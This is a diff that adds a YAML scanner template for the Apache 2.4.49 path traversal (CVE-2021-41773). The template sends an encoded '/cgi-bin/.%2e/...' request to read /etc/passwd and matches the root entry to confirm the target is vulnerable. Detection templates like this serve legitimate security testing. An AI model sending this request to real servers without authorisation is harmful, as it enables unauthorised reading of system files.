@@ -1,0 +1,20 @@
+name: Apache 2.4.49 Path Traversal (CVE-2021-41773)
+manual: true
+query: product="Apache-Web-Server"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+      follow_redirects: true
+    expression: response.status == 200 && "root:[x*]?:0:0:".bmatches(response.body)
+expression: r0()
+detail:
+  author: luckying1314@139.com
+  links:
+  - https://mp.weixin.qq.com/s?src=11&timestamp=1633533436&ver=3358&signature=2WIeZ*MU*D90aNdj2wmW55th5WWecksL2I8I8u2J*jnnq17UCiSkdje1JJGlIqGfzv61pmOfWG7lpRv7rkX1pMirxKVDViUr33H4eKZGzhSfBVtKdXAWV3a5prZoIvq-&new=1
+  description: 'An attacker can use a path-walking attack to map urls to files other
+    than the intended document root.  If files outside the document root are not protected
+    by ''require all denied'', then attackers can access them  '
+  tags: fileread
